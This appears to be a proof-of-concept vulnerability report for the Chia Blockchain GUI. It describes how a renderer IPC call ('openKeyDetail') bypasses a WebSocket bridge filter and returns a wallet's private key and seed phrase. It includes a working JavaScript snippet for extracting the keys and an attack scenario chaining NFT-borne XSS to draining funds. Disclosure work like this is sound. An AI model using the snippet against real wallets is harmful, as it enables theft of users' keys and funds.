# Proof of Concept: Private Key Exposure via WebSocket Bridge Bypass

## Prerequisites

- Chia Blockchain GUI installed and configured
- Chia daemon running with a wallet that has loaded keys
- Node.js and yarn/npm available for building from source

## Reproduction Steps

### Static Analysis

```bash
git clone https://github.com/Chia-Network/chia-blockchain-gui.git
cd chia-blockchain-gui

# Show the security control in the bridge
grep -n "get_private_key" packages/gui/src/electron/utils/webSocketBridge.ts

# Show the bypass in getKeyDetails
grep -n "get_private_key" packages/gui/src/electron/api/getKeyDetails.ts

# Show that sendCommand has no filtering
grep -n "sendCommand" packages/gui/src/electron/api/sendCommand.ts
```

### Runtime Verification

1. Build the GUI from source:
```bash
cd chia-blockchain-gui
yarn install
yarn build
electron .
```

2. Ensure the daemon is running with a loaded wallet.

3. Open Developer Tools in the renderer (Ctrl+Shift+I or Cmd+Option+I).

4. In the renderer console, invoke the IPC channel:
```javascript
const { ipcRenderer } = require('electron');
ipcRenderer.invoke('openKeyDetail', <fingerprint_number>).then(result => {
  console.log('Private key data:', result);
});
```

5. Observe the response containing:
   - The wallet's secret key (256-bit Ed25519 private key)
   - The mnemonic seed phrase
   - Fingerprint and other key material

6. Compare with the intended path through the bridge:
```javascript
// This would be blocked:
// Renderer → webSocketBridge → get_private_key → BLOCKED (returns null)
```

## Expected Result

The `get_private_key` command should be blocked from reaching the renderer. Only the main process should have access to private key material.

## Actual Result (Vulnerable)

The renderer receives the full private key material through the `getKeyDetails` → `sendCommand` bypass path. The security control in `webSocketBridge.ts` is completely circumvented.

## Impact

A compromised renderer process (via XSS, malicious NFT content, or dependency supply chain attack) can extract the user's private key and mnemonic seed, enabling complete drainage of all funds from the wallet.

## Attack Scenario

1. Attacker finds an XSS vulnerability in NFT preview rendering
2. Attacker crafts a malicious NFT with embedded JavaScript payload
3. User views the NFT in the Chia GUI
4. XSS payload executes in the renderer context
5. Payload calls `ipcRenderer.invoke('openKeyDetail', fingerprint)`
6. `getKeyDetails` bypasses the bridge security control
7. Private key is returned to the renderer
8. Attacker exfiltrates the private key
9. Attacker drains all funds from the wallet
